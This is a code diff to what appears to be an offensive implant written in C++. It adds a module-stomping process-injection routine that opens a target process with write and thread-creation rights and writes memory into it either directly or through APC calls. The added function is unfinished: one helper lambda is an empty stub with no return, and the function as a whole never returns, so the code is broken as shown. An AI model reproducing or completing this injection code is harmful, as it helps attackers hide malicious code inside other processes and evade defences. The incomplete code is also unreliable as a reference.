@@ -19,8 +19,8 @@ auto DECLFN Injection::Standard(
     HANDLE ThreadHandle= INVALID_HANDLE_VALUE;
     ULONG  ThreadId    = 0;
     SIZE_T FullSize    = ArgSize + Size;
-    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
     HANDLE PsHandle    = INVALID_HANDLE_VALUE;
+    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
 
     if ( ! Object->PsHandle ) {
         PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
@@ -113,3 +113,47 @@ auto DECLFN Injection::Standard(
 
     return Cleanup( TRUE );
 }
+
+auto DECLFN Injection::Stomp(
+    _In_    BYTE*    Buffer,
+    _In_    SIZE_T   Size,
+    _In_    BYTE*    ArgBuff,
+    _In_    SIZE_T   ArgSize,
+    _In_    CHAR*    TaskUUID,
+    _Inout_ INJ_OBJ* Object
+) -> BOOL {
+    HANDLE FileHandle = INVALID_HANDLE_VALUE;
+    HANDLE PsHandle   = INVALID_HANDLE_VALUE;
+
+    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
+
+    if ( ! Object->PsHandle ) {
+        PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
+        if ( PsHandle == INVALID_HANDLE_VALUE ) {
+            return FALSE;
+        }
+    } else {
+        PsHandle = Object->PsHandle;
+    }
+
+    auto GetTargetDll = [&]( BOOL IsRnd ) -> CHAR* {
+        CHAR* DllName = nullptr;
+
+        if ( IsRnd ) {
+            
+        }
+    };
+
+    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
+        BOOL result = FALSE;
+        if ( PsHandle == NtCurrentProcess() ) {
+             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
+             return result;
+        } else if (Self->Inj->Ctx.Write == 0) {
+            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
+        } else {
+            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
+        }
+        return result;
+    };
+}   
